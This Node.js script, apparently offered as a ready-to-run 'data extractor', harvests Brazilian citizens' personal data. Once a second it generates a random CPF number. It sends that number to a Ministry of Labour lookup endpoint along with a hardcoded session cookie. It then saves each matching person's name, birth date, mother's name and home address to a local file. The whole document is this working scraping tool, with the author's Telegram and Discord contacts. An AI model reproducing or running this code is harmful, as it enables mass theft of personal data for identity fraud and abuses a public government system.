const readlineSync = require('readline-sync');
const fs = require('fs')
const { curl, GetStr, rand } = require('johngrimm-utils');
const { exitCode } = require('process');
console.clear();

console.log("#========================#")
console.log("#                        #")
console.log("#    EXTRATOR DE DADOS   #")
console.log("#                        #")
console.log("#========================#\n")

console.log("1 - Sobre");
console.log("2 - Consulta");
console.log("3 - Fechar");

var teste = readlineSync.question('Selecione a opcao acima: ');

if (teste == 1) {
  console.clear();

  console.log(`Qualquer duvida entre em contato!
  
  • Telegram: @y0rkzin
  • Discord: 𝙤𝙣𝙚7 !#0001`)

} else if (teste == 2) {

  console.clear();
  console.log("#====================#")
  console.log("#     AGUARDE!..     #")
  console.log("#====================#")

  setInterval(async () => {

    const d0 = await curl({
      url: 'https://www.4devs.com.br/ferramentas_online.php',
      method: "POST",
      body: `acao=gerar_cpf&pontuacao=N&cpf_estado=SP`,
      headers: {
          'host': 'www.4devs.com.br',
          'accept': '/',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'origin': 'https://www.4devs.com.br',
          'referer': 'https://www.4devs.com.br/gerador_de_cpf',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36'
      }
  })

  const d1 = await curl({
      url: 'http://www.juventudeweb.mte.gov.br/pnpepesquisas.asp',
      method: "POST",
      body: `acao=consultar%20cpf&cpf=${d0}`,
      headers: {
          'Content-Type': 'text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1',
          'Cookie': 'ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID; FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78',
          'Host': 'www.juventudeweb.mte.gov.br'
      }
  })

  if (d1.includes('NRCPF')) {
      var nome = GetStr(d1, 'NOPESSOAFISICA="', '"')
      var nasc = GetStr(d1, 'DTNASCIMENTO="', '"')
      var rua = GetStr(d1, 'NOLOGRADOURO="', '"')
      var numCasa = GetStr(d1, 'NRLOGRADOURO="', '"')
      var complemento = GetStr(d1, 'DSCOMPLEMENTO="', '"')
      var bairro = GetStr(d1, 'NOBAIRRO="', '"')
      var cep = GetStr(d1, 'NRCEP="', '"')
      var cidade = GetStr(d1, 'NOMUNICIPIO="', '"')
      var uf = GetStr(d1, 'SGUF="', '"')
      var nomeMae = GetStr(d1, 'NOMAE="', '"')
      let [ dia, mes, ano ] = nasc.split(/\/|\||\\|\;|\:|\»/g)

      const street = `RUA ${rua}, ${numCasa} ${complemento} - ${bairro}, ${cidade}/${uf} - ${cep}`

      var retorno = `CPF ENCONTRADO (${d0}) > CPF: ${d0} > NOME: ${nome} > DAT NASC: ${nasc} > NOME MAE: ${nomeMae} > ENDEREÇO: ${street.toUpperCase()}\n`
      
      
      fs.writeFile('dados extraidos.txt', retorno, {enconding:'utf-8',flag: 'a'}, function (err) {
        if (err) throw err;
        console.log('Dados Encontrados!');
    });
  }

  }, 1000 * 1)

}